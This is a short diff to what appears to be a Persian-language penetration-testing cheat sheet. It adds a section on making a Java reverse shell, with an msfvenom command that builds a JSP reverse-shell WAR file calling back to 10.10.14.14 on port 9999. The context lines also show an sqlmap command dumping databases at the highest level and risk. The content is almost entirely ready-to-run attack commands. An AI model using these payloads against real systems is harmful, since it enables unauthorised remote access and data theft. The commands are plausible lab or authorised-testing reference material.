@@ -519,6 +519,12 @@ sqlmap -r json  --tamper=charunicodeescape  --dump --level=5 --risk=3 --dbs --co
 cb.exe
 ```
 
+### ایجاد reverse shell جاوا
+
+```text
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=9999 -f WAR > exploit.war
+```
+
 ### ایجاد reverse shell برای ویندوز با msfvenom
 
 
